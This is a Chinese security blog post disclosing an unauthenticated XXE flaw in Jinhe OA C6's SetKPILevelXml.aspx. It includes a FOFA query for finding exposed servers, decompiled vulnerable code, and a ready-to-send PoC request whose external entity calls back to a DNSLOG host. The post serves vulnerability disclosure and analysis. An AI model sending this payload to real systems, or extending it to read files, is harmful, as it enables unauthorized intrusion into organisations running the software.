---
title: "金和OA SetKPILevelXml.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-SetKPILevelXml-xxe.html
asset_dir: assets/金和oa-setkpilevelxml.aspx-xxe漏洞
---

# 金和OA SetKPILevelXml.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/11/1 13:31
- 371浏览
- [0评论](#comment)
- 9分钟阅读

深入探索

网络安全培训

服务器安全服务

漏洞修复方案

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `SetKPILevelXml.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞修复方案

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `SetKPILevelXml.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Appraise.dll` 将其进行反编译后找到 **SetKPILevelXml** 的处理逻辑

深入探索

漏洞预警服务

计算机安全

编码转换工具

```
protected void Page_Load(object sender, EventArgs e)
{
  string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.LoadXml(end);
```

请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

## XXE

```
POST /c6/Jhsoft.Web.Appraise/SetKPILevelXml.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到HTTP请求

网络安全

[![金和OA SetKPILevelXml.aspx XXE漏洞](images/img-001-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.XXE](#toc-5-1-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
